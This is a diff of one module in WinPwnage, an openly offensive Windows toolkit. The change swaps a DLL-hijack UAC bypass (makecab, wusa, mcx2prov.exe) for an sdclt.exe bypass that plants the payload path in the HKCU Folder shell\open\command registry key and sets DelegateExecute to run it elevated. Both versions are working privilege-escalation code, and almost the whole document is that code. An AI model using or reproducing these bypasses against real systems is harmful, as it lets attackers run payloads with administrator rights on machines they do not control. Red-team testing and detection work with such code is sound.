+++ winpwnage/functions/uac/uacMethod12.py
@@ -1,132 +1,62 @@
 import os
 import time
-import tempfile
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
+#http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
+
 uacMethod12_info = {
-	"Description": "UAC bypass using mcx2prov.exe (DLL payload only)",
-	"Method": "DLL hijack using makecab and wusa",
+	"Description": "UAC bypass using sdclt.exe (Folder)",
+	"Method": "Registry key (Class) manipulation",
 	"Id": "12",
 	"Type": "UAC bypass",
-	"Fixed In": "10147",
-	"Works From": "7600",
+	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
+	"Works From": "14393",
 	"Admin": False,
 	"Function Name": "uacMethod12",
 	"Function Payload": True,
 }
 
-
-def uacMethod12_cleanup():
+def uacMethod12_cleanup(path):
 	print_info("Performing cleaning")
-	if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")):
-		try:
-			os.remove(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"))
-		except Exception:
-			print_warning("Unable to delete file: ({path})".format(
-							path=os.path.join(tempfile.gettempdir(),
-							"CRYPTBASE.dll")))
-		else:
-			print_success("Successfully deleted file: ({path})".format(
-							path=os.path.join(tempfile.gettempdir(),
-							"CRYPTBASE.dll")))
+	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
+		print_success("Successfully cleaned up")
+		print_success("All done!")
 	else:
-		pass
+		print_error("Unable to cleanup")
+		return False
 
-	if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")):
-		try:
-			os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
-		except Exception:
-			print_warning("Unable to delete file: ({path})".format(
-							path=os.path.join(tempfile.gettempdir(),
-							"suspicious.cab")))
-		else:
-			print_success("Successfully deleted file: ({path})".format(
-							path=os.path.join(tempfile.gettempdir(),
-							"suspicious.cab")))
-	else:
-		pass
-		
 def uacMethod12(payload):
-	if payloads().dll(payload):
-		try:
-			payload_data = open(os.path.join(payload), "rb").read()
-		except Exception:
-			print_error("Unable to read payload data, cannot proceed")
-			return False
+	if payloads().exe(payload):
+		path = "Software\\Classes\\Folder\\shell\\open\\command"
 
-		try:
-			dll_file = open(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"), "wb")
-			dll_file.write(payload_data)
-			dll_file.close()
-		except Exception:
-			print_error("Unable to write payload to disk: ({path})".format(
-						path=os.path.join(tempfile.gettempdir(),
-						"CRYPTBASE.dll")))
-			return False
-
-		time.sleep(5)
-
-		if os.path.isfile(os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll")) == True:
-			if process().create("makecab.exe", params="{} {}".format(
-					os.path.join(tempfile.gettempdir(), "CRYPTBASE.dll"),
-					os.path.join(tempfile.gettempdir(), "suspicious.cab"))):
-				print_success("Successfully created cabinet file")
+		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payloads().exe(payload)[1], create=True):
+			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
+				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payloads().exe(payload)[1])))
 			else:
-				print_error("Unable to create cabinet file")
+				print_error("Unable to create registry keys")
 				for x in Constant.output:
 					if "error" in x:
-						uacMethod12_cleanup()
+						uacMethod12_cleanup(path)
 						return False
 		else:
-			print_error("Unable to create cabinet file, dll file is not found")
-			for x in Constant.output:
-				if "error" in x:
-					uacMethod12_cleanup()
-					return False
-			
+			print_error("Unable to create registry keys")
+			return False
+
 		time.sleep(5)
 
-		if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
-			if process().create("wusa.exe", params="{} /extract:{}\\ehome /quiet".format(
-					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
-					information().windows_directory())):
-				print_success("Successfully extracted cabinet file")
-			else:
-				print_error("Unable to extract cabinet file")
-				for x in Constant.output:
-					if "error" in x:
-						uacMethod12_cleanup()
-						return False
-		else:
-			print_error("Unable to extract cabinet file, cabinet file is not found")
-			for x in Constant.output:
-				if "error" in x:
-					uacMethod12_cleanup()
-					return False
-		
-		time.sleep(5)
-		
 		print_info("Disabling file system redirection")
 		with disable_fsr():
 			print_success("Successfully disabled file system redirection")
-			if os.path.exists(os.path.join(information().windows_directory(), 'ehome', 'mcx2prov.exe')):
-				if process().create(os.path.join(information().windows_directory(), 'ehome', 'mcx2prov.exe')):
-					print_success("Successfully executed mcx2prov executable")
-					time.sleep(5)
-					if uacMethod12_cleanup():
-						print_success("All done!")
-				else:
-					print_error("Unable to execute mcx2prov executable")
-					for x in Constant.output:
-						if "error" in x:
-							uacMethod12_cleanup()
-							return False
+			if process().create("sdclt.exe"):
+				print_success("Successfully spawned process ({})".format(payloads().exe(payload)[1]))
+				time.sleep(5)
+				uacMethod12_cleanup(path)
 			else:
-				print_error("Cannot find mcx2prov")
+				print_error("Unable to spawn process ({})".format(os.path.join(payloads().exe(payload)[1])))
 				for x in Constant.output:
 					if "error" in x:
-						uacMethod12_cleanup()
+						uacMethod12_cleanup(path)
 						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
